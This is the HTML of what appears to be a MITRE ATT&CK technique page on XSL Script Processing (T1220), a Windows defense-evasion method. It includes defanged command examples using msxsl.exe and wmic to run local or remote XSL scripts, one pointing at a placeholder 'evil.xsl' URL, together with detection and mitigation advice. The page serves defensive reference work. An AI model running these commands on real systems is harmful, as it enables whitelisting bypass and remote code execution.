<div class="container-fluid">
 <h1>
  XSL Script Processing
 </h1>
 <div class="row">
  <div class="col-md-8 description-body">
   <p>
    Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.
    <span class="scite-citeref-number" data-reference="Microsoft XSLT Script Mar 2017" id="scite-ref-1-a">
     <sup>
      <a aria-describedby="qtip-0" data-hasqtip="0" href="https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script" target="_blank">
       [1]
      </a>
     </sup>
    </span>
   </p>
   <p>
    Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to
    <a href="https://attack.mitre.org/techniques/T1127">
     Trusted Developer Utilities
    </a>
    , the Microsoft common line transformation utility binary (msxsl.exe)
    <span class="scite-citeref-number" data-reference="Microsoft msxsl.exe" id="scite-ref-2-a">
     <sup>
      <a aria-describedby="qtip-1" data-hasqtip="1" href="https://www.microsoft.com/download/details.aspx?id=21714" target="_blank">
       [2]
      </a>
     </sup>
    </span>
    can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.
    <span class="scite-citeref-number" data-reference="Penetration Testing Lab MSXSL July 2017" id="scite-ref-3-a">
     <sup>
      <a aria-describedby="qtip-2" data-hasqtip="2" href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/" target="_blank">
       [3]
      </a>
     </sup>
    </span>
    Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.
    <span class="scite-citeref-number" data-reference="Reaqta MSXSL Spearphishing MAR 2018" id="scite-ref-4-a">
     <sup>
      <a aria-describedby="qtip-3" data-hasqtip="3" href="https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/" target="_blank">
       [4]
      </a>
     </sup>
    </span>
   </p>
   <p>
    Command-line example:
    <span class="scite-citeref-number" data-reference="Penetration Testing Lab MSXSL July 2017" id="scite-ref-3-a">
     <sup>
      <a aria-describedby="qtip-2" data-hasqtip="2" href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/" target="_blank">
       [3]
      </a>
     </sup>
    </span>
   </p>
   <ul>
    <li>
     <code>
      msxsl.exe customers[.]xml script[.]xsl
     </code>
    </li>
   </ul>
   <p>
    Another variation of this technique, dubbed "Squiblytwo", involves using
    <a href="https://attack.mitre.org/techniques/T1047">
     Windows Management Instrumentation
    </a>
    to invoke JScript or VBScript within an XSL file.
    <span class="scite-citeref-number" data-reference="subTee WMIC XSL APR 2018" id="scite-ref-5-a">
     <sup>
      <a aria-describedby="qtip-4" data-hasqtip="4" href="https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html" target="_blank">
       [5]
      </a>
     </sup>
    </span>
    This technique can also execute local/remote scripts and, similar to its
    <a href="https://attack.mitre.org/techniques/T1117">
     Regsvr32
    </a>
    / "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool.
   </p>
   <p>
    Command-line examples:
    <span class="scite-citeref-number" data-reference="subTee WMIC XSL APR 2018" id="scite-ref-5-a">
     <sup>
      <a aria-describedby="qtip-4" data-hasqtip="4" href="https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html" target="_blank">
       [5]
      </a>
     </sup>
    </span>
   </p>
   <ul>
    <li>
     Local File:
     <code>
      wmic process list /FORMAT:evil[.]xsl
     </code>
    </li>
    <li>
     Remote File:
     <code>
      wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"
     </code>
    </li>
   </ul>
  </div>
  <div class="col-md-4">
   <div class="card">
    <div class="card-body">
     <div class="card-data">
      <span class="h5 card-title">
       ID
      </span>
      : T1220
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Tactic
      </span>
      : Defense Evasion, Execution
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Platform:
      </span>
      Windows
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       System Requirements:
      </span>
      Microsoft Core XML Services (MSXML) or access to wmic.exe
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Permissions Required:
      </span>
      User
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Data Sources:
      </span>
      Process monitoring, Process command-line parameters, Process use of network, DLL monitoring
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Supports Remote:
      </span>
      No
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Defense Bypassed:
      </span>
      Anti-virus, Application whitelisting, Digital Certificate Validation
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
      </span>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Contributors:
      </span>
      Casey Smith; Praetorian
      <br/>
      <br/>
     </div>
     <div class="card-data">
      <span class="h5 card-title">
       Version
      </span>
      : 1.0
     </div>
    </div>
   </div>
  </div>
 </div>
 <h2 class="pt-3" id="examples">
  Examples
 </h2>
 <table class="table table-bordered table-light mt-2">
  <thead>
   <tr>
    <th scope="col">
     Name
    </th>
    <th scope="col">
     Description
    </th>
   </tr>
  </thead>
  <tbody class="bg-white">
   <tr>
    <td>
     <a href="https://attack.mitre.org/software/S0373">
      Astaroth
     </a>
    </td>
    <td>
     <p>
      <a href="https://attack.mitre.org/software/S0373">
       Astaroth
      </a>
      executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.
      <span class="scite-citeref-number" data-reference="Cybereason Astaroth Feb 2019" id="scite-ref-6-a" onclick="scrollToRef('scite-6')">
       <sup>
        <a aria-describedby="qtip-5" data-hasqtip="5" href="https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research" target="_blank">
         [6]
        </a>
       </sup>
      </span>
     </p>
    </td>
   </tr>
   <tr>
    <td>
     <a href="https://attack.mitre.org/groups/G0080">
      Cobalt Group
     </a>
    </td>
    <td>
     <p>
      <a href="https://attack.mitre.org/groups/G0080">
       Cobalt Group
      </a>
      used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.
      <span class="scite-citeref-number" data-reference="Talos Cobalt Group July 2018" id="scite-ref-7-a" onclick="scrollToRef('scite-7')">
       <sup>
        <a aria-describedby="qtip-6" data-hasqtip="6" href="https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html" target="_blank">
         [7]
        </a>
       </sup>
      </span>
     </p>
    </td>
   </tr>
  </tbody>
 </table>
 <h2 class="pt-3" id="mitigation">
  Mitigation
 </h2>
 <p>
  <a href="https://attack.mitre.org/techniques/T1047">
   Windows Management Instrumentation
  </a>
  and/or msxsl.exe may or may not be used within a given environment. Disabling WMI may cause system instability and should be evaluated to assess the impact to a network. If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.
 </p>
 <h2 class="pt-3" id="detection">
  Detection
 </h2>
 <p>
  Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting).
  <span class="scite-citeref-number" data-reference="subTee WMIC XSL APR 2018" id="scite-ref-5-a">
   <sup>
    <a aria-describedby="qtip-4" data-hasqtip="4" href="https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html" target="_blank">
     [5]
    </a>
   </sup>
  </span>
  <span class="scite-citeref-number" data-reference="Twitter SquiblyTwo Detection APR 2018" id="scite-ref-8-a">
   <sup>
    <a aria-describedby="qtip-7" data-hasqtip="7" href="https://twitter.com/dez_/status/986614411711442944" target="_blank">
     [8]
    </a>
   </sup>
  </span>
  Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.
 </p>
 <p>
  The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.
 </p>
 <h2 class="pt-3" id="references">
  References
 </h2>
 <div class="row">
  <div class="col">
   <ol>
    <li>
     <span class="scite-citation" id="scite-1">
      <span class="scite-citation-text">
       <a class="external text" href="https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script" name="scite-1" rel="nofollow" target="_blank">
        Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using
        <msxsl:script>
         . Retrieved July 3, 2018.
        </msxsl:script>
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-2">
      <span class="scite-citation-text">
       <a class="external text" href="https://www.microsoft.com/download/details.aspx?id=21714" name="scite-2" rel="nofollow" target="_blank">
        Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-3">
      <span class="scite-citation-text">
       <a class="external text" href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/" name="scite-3" rel="nofollow" target="_blank">
        netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-4">
      <span class="scite-citation-text">
       <a class="external text" href="https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/" name="scite-4" rel="nofollow" target="_blank">
        Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.
       </a>
      </span>
     </span>
    </li>
   </ol>
  </div>
  <div class="col">
   <ol start="5.0">
    <li>
     <span class="scite-citation" id="scite-5">
      <span class="scite-citation-text">
       <a class="external text" href="https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html" name="scite-5" rel="nofollow" target="_blank">
        Smith, C. (2018, April 17). WMIC.EXE Whitelisting Bypass - Hacking with Style, Stylesheets. Retrieved July 3, 2018.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-6">
      <span class="scite-citation-text">
       <a class="external text" href="https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research" name="scite-6" rel="nofollow" target="_blank">
        Salem, E. (2019, February 13). ASTAROTH MALWARE USES LEGITIMATE OS AND ANTIVIRUS PROCESSES TO STEAL PASSWORDS AND PERSONAL DATA. Retrieved April 17, 2019.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-7">
      <span class="scite-citation-text">
       <a class="external text" href="https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html" name="scite-7" rel="nofollow" target="_blank">
        Svajcer, V. (2018, July 31). Multiple Cobalt Personality Disorder. Retrieved September 5, 2018.
       </a>
      </span>
     </span>
    </li>
    <li>
     <span class="scite-citation" id="scite-8">
      <span class="scite-citation-text">
       <a class="external text" href="https://twitter.com/dez_/status/986614411711442944" name="scite-8" rel="nofollow" target="_blank">
        Desimone, J. (2018, April 18). Status Update. Retrieved July 3, 2018.
       </a>
      </span>
     </span>
    </li>
   </ol>
  </div>
 </div>
</div>
